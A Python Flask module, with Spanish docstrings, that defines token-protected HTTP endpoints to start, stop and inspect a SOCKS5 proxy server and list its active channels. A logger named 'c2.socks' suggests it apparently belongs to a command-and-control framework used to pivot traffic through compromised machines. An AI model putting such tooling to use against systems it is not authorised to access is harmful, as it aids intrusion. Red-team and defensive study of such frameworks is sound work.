"""Endpoints HTTP para el servicio SOCKS5 proxy."""
import logging

from flask import Blueprint, jsonify, request

import config
from models import require_token
from socks import socks_server

log = logging.getLogger("c2.socks")

socks_api = Blueprint("socks_api", __name__)


@socks_api.route("/socks/start", methods=["POST"])
@require_token
def start_socks():
    """Inicia el servidor SOCKS5 local."""
    data = request.get_json(silent=True) or {}
    host = data.get("host", "127.0.0.1")
    port = data.get("port", 1080)

    try:
        socks_server.host = host
        socks_server.port = port
        socks_server.start()
        log.info(f"SOCKS5 server started on {host}:{port}")
        return jsonify({
            "status": "ok",
            "message": f"SOCKS5 server listening on {host}:{port}",
            "host": host,
            "port": port
        })
    except Exception as e:
        log.error(f"Failed to start SOCKS5 server: {e}")
        return jsonify({"error": str(e)}), 500


@socks_api.route("/socks/stop", methods=["POST"])
@require_token
def stop_socks():
    """Detiene el servidor SOCKS5."""
    try:
        socks_server.stop()
        log.info("SOCKS5 server stopped")
        return jsonify({"status": "ok", "message": "SOCKS5 server stopped"})
    except Exception as e:
        log.error(f"Failed to stop SOCKS5 server: {e}")
        return jsonify({"error": str(e)}), 500


@socks_api.route("/socks/status", methods=["GET"])
@require_token
def socks_status():
    """Devuelve el estado del servidor SOCKS5."""
    return jsonify({
        "running": socks_server.running,
        "host": socks_server.host,
        "port": socks_server.port,
        "channels": len(socks_server.channels),
        "channel_list": list(socks_server.channels.keys())
    })


@socks_api.route("/socks/channels", methods=["GET"])
@require_token
def list_channels():
    """Lista los canales SOCKS activos."""
    channels = []
    for channel_id, channel in socks_server.channels.items():
        channels.append({
            "channel_id": channel_id,
            "target": channel["target"],
            "created": channel["created"]
        })
    return jsonify({"channels": channels})
